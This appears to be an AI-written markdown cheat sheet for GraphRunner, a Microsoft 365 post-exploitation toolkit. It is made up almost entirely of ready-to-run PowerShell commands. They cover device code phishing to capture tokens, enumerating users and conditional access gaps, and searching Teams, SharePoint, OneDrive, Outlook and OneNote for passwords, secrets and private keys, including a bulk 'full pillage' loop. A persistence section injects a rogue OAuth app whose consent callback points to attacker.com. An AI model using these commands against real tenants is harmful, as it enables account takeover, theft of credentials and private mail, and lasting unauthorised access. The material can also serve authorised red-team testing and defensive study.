# GraphRunner

**Tags:** `#graphrunner` `#microsoft365` `#graph` `#cloud` `#postexploitation` `#pillaging` `#teams` `#sharepoint` `#outlook`

Microsoft Graph API post-exploitation toolkit — focused on pillaging M365 data after gaining a valid access token. Targets Teams messages, SharePoint files, OneDrive, Outlook email, and OneNote for credential and sensitive data harvesting. Also includes token management, device code phishing, and conditional access policy enumeration.

**Source:** https://github.com/dafthack/GraphRunner
**Install:**
```powershell
git clone https://github.com/dafthack/GraphRunner
Import-Module .\GraphRunner.ps1
```

> [!note] **GraphRunner use case** — Once you have a valid M365 access token (via spray, phishing, device code, or token theft), GraphRunner automates the pillaging phase: searching Teams for passwords, pulling SharePoint files, reading emails, finding stored credentials. It's the post-auth M365 data harvesting tool.

---

## Authentication & Token Management

```powershell
# Interactive login (browser)
Get-GraphTokens

# Device code phishing — generate a code for the target to enter
Invoke-DeviceCodeFlow -Tenant <tenant-id>
# Displays user_code — phish the target to microsoft.com/devicelogin
# Polls and captures token automatically

# Refresh an existing token
Invoke-RefreshToAzureManagementToken -Tokens $tokens
Invoke-RefreshToMSGraphToken -Tokens $tokens
Invoke-RefreshToSharePointToken -Tokens $tokens -Domain <company>

# Check token validity and scopes
Invoke-GraphListing -Resource "me" -Tokens $tokens    # simple identity check

# Set tokens globally for session
$tokens = Get-GraphTokens
```

---

## Recon

```powershell
# Tenant and user info
Invoke-GraphListing -Resource "me" -Tokens $tokens
Invoke-GraphListing -Resource "organization" -Tokens $tokens

# All users
Get-AzureADUsers -Tokens $tokens
Get-AzureADUsers -Tokens $tokens | Select-Object DisplayName, UserPrincipalName, JobTitle

# All groups
Get-AzureADGroups -Tokens $tokens

# Conditional access policies (find gaps)
Get-ConditionalAccessPolicies -Tokens $tokens

# Registered applications (find over-permissive apps)
Get-AzureADApps -Tokens $tokens
```

---

## Teams Pillaging

```powershell
# List all Teams the user belongs to
Get-Teams -Tokens $tokens

# Get channels for a team
Get-TeamChannels -Tokens $tokens -TeamId <team-id>

# Dump all messages from a channel
Get-ChannelMessages -Tokens $tokens -TeamId <team-id> -ChannelId <channel-id>

# Search Teams messages for keywords (passwords, secrets, VPN, credentials, etc.)
Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "password"
Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "secret"
Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "vpn"
Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "ssh"
Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm "credentials"

# Dump ALL Teams messages (thorough but slow)
Invoke-DumpTeamsMessages -Tokens $tokens
```

---

## SharePoint & OneDrive Pillaging

```powershell
# List SharePoint sites
Get-SharePointSiteURLs -Tokens $tokens

# List files in a SharePoint site
Get-SharePointFiles -Tokens $tokens -SiteUrl <url>

# Search SharePoint for keywords
Invoke-SearchSharePoint -Tokens $tokens -SearchTerm "password"
Invoke-SearchSharePoint -Tokens $tokens -SearchTerm "credentials"
Invoke-SearchSharePoint -Tokens $tokens -SearchTerm ".pfx"
Invoke-SearchSharePoint -Tokens $tokens -SearchTerm "private key"

# OneDrive files
Get-OneDriveFiles -Tokens $tokens
Get-OneDriveFiles -Tokens $tokens -User <upn>
```

---

## Outlook / Email Pillaging

```powershell
# Read user's email
Get-Inbox -Tokens $tokens
Get-Inbox -Tokens $tokens -User <upn>    # requires Mail.Read.All (admin)

# Search email
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "credentials"
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "reset"
Invoke-SearchMailbox -Tokens $tokens -User <upn> -SearchTerm "MFA"

# Read specific email
Get-Email -Tokens $tokens -MessageId <id>
```

---

## OneNote Pillaging

```powershell
# List notebooks
Get-OneNoteNotebooks -Tokens $tokens

# Get sections and pages
Get-OneNotePages -Tokens $tokens -NotebookId <id>

# Search OneNote content
Invoke-SearchOneNote -Tokens $tokens -SearchTerm "password"
```

---

## Persistence & Backdoors

```powershell
# Add app registration with high-value permissions (for persistent token access)
Invoke-InjectOAuthApp -Tokens $tokens -AppName "IT Support" `
  -ReplyUrl "https://attacker.com/callback" `
  -Scope "Mail.Read,Files.ReadWrite.All,offline_access"
# Returns a phishing URL — send to target user for OAuth consent

# Add owner to app registration for persistent secret access
Invoke-AddOwnerToApp -Tokens $tokens -AppId <app-id> -UserId <your-id>
```

---

## Useful Searches (Quick Pillage)

```powershell
# Full pillage run — common credential-bearing search terms
$terms = @("password", "passwd", "secret", "credential", "vpn", "ssh", "token", "api key", "private key", ".pfx", "keepass")
foreach ($term in $terms) {
    Write-Host "[*] Searching: $term"
    Invoke-SearchTeamsMessages -Tokens $tokens -SearchTerm $term
    Invoke-SearchSharePoint -Tokens $tokens -SearchTerm $term
    Invoke-SearchMailbox -Tokens $tokens -SearchTerm $term
}
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
